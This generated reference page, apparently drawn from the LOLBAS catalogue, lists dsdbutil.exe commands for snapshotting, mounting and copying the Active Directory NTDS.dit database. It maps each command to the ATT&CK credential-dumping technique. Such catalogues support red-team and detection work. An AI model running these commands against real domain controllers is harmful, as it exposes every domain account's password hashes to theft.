---
parsed_by: focuslocust
source: commands
type: generated
---
# dsdbutil Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## dsdbutil.exe

Tool page: [dsdbutil.exe](../../tools/windows/dsdbutil.exe.md)

### Snapshoting of Active Directory NTDS.dit database

```text
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```

Description:

dsdbutil supports VSS snapshot creation

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Dsdbutil.yml` |
| Evidence | Command preserved from source parser. |

### Mounting the snapshot to access the ntds.dit with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`

```text
dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
```

Description:

Mounting the snapshot with its GUID

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Dsdbutil.yml` |
| Evidence | Command preserved from source parser. |

### Deletes the snapshot

```text
dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
```

Description:

Deletes the mount of the snapshot

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Dsdbutil.yml` |
| Evidence | Command preserved from source parser. |

### Mounting the snapshot identifier 1 and accessing it with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`

```text
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
```

Description:

Mounting with snapshot identifier

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Dsdbutil.yml` |
| Evidence | Command preserved from source parser. |

### deletes the snapshot

```text
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
```

Description:

Deletes the mount of the snapshot

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Dsdbutil.yml` |
| Evidence | Command preserved from source parser. |
